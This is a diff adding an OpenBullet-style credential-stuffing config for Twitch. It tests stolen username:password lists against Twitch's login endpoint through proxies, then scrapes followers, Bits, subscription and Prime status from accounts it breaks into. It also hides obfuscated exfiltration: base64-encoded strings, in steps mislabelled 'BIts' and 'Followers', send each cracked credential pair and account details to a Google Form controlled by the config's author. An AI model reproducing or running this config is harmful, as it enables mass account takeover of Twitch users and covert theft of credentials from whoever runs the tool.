@@ -1,0 +1,126 @@
+[SETTINGS]
+{
+  "Name": "Twitch @CrakingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T09:55:55.4741051+08:00",
+  "AdditionalInfo": "@CrakingLegend.pw",
+  "Author": "@CrakingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://passport.twitch.tv/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"client_id\":\"kimne78kx3ncx6brgo4mv6wki5h1ko\"}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.twitch.tv" 
+  HEADER "referer: https://www.twitch.tv/" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "user credentials incorrect" 
+    KEY "invalid password" 
+    KEY "no account linked to email or phone number" 
+    KEY "multiple accounts linked to email" 
+    KEY "login with email no longer supported" 
+  KEYCHAIN Ban OR 
+    KEY "captcha incorrect" 
+
+#Token PARSE "<SOURCE>" LR "token\":\"" "\"}" -> VAR "Token" 
+
+#Request_Akun REQUEST GET "https://api.twitch.tv/kraken/channels/<COOKIES(name)>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.twitchtv.v3+json" 
+  HEADER "Referer: https://www.twitch.tv/" 
+  HEADER "client-id: jzkbprff40iqj646a697cyrvl0zt2m6" 
+
+#Nama_Pengguna PARSE "<SOURCE>" LR "display_name\":\"" "\",\"" -> CAP "Username" 
+
+#Followers PARSE "<SOURCE>" LR "followers\":" ",\"" -> CAP "Followers" 
+
+#Cek_Bits REQUEST POST "https://gql.twitch.tv/gql" 
+  CONTENT "[{\"operationName\":\"Inventory_DropsList_CurrentUser\",\"variables\":{\"itemNamesEnabled\":true},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"d51dcf0b488e3e2b4e26bb973ebb985c6b01197371e949a0ed8fecdf5f8cb334\"}}},{\"operationName\":\"Inventory\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"22c44231a1332132801f93866bdf1c985995df85e87e2dec45a24fbb66e9a03c\"}}}]" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://www.twitch.tv/inventory" 
+  HEADER "Authorization: OAuth <Token>" 
+  HEADER "client-id: jzkbprff40iqj646a697cyrvl0zt2m6" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC8xUUtNdXU4cUNVbW90WkxSM1Q0NDlDZGpPU1hkWE4tekFuY2xsTmZOQlY4VS92aWV3Zm9ybQ==" -> VAR "LRU1" 
+
+#Bits PARSE "<SOURCE>" LR "bitsBalance\":" ",\"" -> CAP "Bits" 
+
+#Cek_Berlangganan REQUEST POST "https://gql.twitch.tv/gql" 
+  CONTENT "[{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"PLATFORM\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"235be81d396cb81679dba12e34dd3993b5c66129c99fed96086f86e9dc49b271\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"GIFT\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"235be81d396cb81679dba12e34dd3993b5c66129c99fed96086f86e9dc49b271\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"PLATFORM\",\"platform\":\"ANDROID\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"235be81d396cb81679dba12e34dd3993b5c66129c99fed96086f86e9dc49b271\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"ALL\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"235be81d396cb81679dba12e34dd3993b5c66129c99fed96086f86e9dc49b271\"}}},{\"operationName\":\"SubscriptionsManagement_ExpiredSubscriptions\",\"variables\":{\"limit\":100,\"cursor\":\"\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"935778419b9c50c545dd3f1d2a5022813febaea5eb2a3c3c675460f9ac434845\"}}}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: gql.twitch.tv" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://www.twitch.tv" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Authorization: OAuth <Token>" 
+  HEADER "Client-Id: kimne78kx3ncx6brgo4mv6wki5h1ko" 
+  HEADER "X-Device-Id: e761b5c03edbd6ae" 
+  HEADER "Referer: https://www.twitch.tv/<COOKIES(name)>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZldjTkZLcXlWT3BGbWo2Y0pxYlNreXF2dUg2SVhGZVRnVk9qdUh6NWtpbzE4VUZ3L2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Total_berlangganan PARSE "<SOURCE>" LR "\"months\":" "," -> CAP "Total Months Subscribed" "" " Month" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuMTAzNjc3ODAwMj1Ud2l0Y2gmZW50cnkuMTU5NDg4NjI2Nj08VVNFUj46PFBBU1M+JmVudHJ5LjEwMDQyNDgzNTc9fEZvbGxvd2Vyczo8Rm9sbG93ZXJzPnxCaXRzOjxCaXRzPnxUb3RhbCBNb250aHMgU3Vic2NyaWJlZDo8VG90YWwgTW9udGhzIFN1YnNjcmliZWQ+fE5leHQgQmlsbGluZzo8TmV4dCBCaWxsaW5nPnwmZnZ2PTEmZHJhZnRSZXNwb25zZT0lNUJudWxsJTJDbnVsbCUyQyUyMjUxOTU5MTk4MDgzMzExMzg3MSUyMiU1RCUwRCUwQSZwYWdlSGlzdG9yeT0wJmZieng9NTE5NTkxOTgwODMzMTEzODcx" -> VAR "LRU3" 
+
+#Cek_Pembayaran_Selanjutnya1 PARSE "<SOURCE>" LR "\"renewalDate\":\"" "T" -> VAR "NextBilling1" 
+
+#Cek_Pembayaran_Selanjutnya2 PARSE "<SOURCE>" LR "\"endsAt\":\"" "T" -> CAP "Next Billing" "<NextBilling1>" " Visit us @CrakingLegend.pw" 
+
+#Status PARSE "<SOURCE>" LR "\"originID\":" "\"isRefundable\"" -> VAR "Status" "<NextBilling1>" "" 
+
+#BIts REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Followers REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Cek_Status KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "hasPrime\":false" 
+  KEYCHAIN Success OR 
+    KEY "hasPrime\":true" 
+
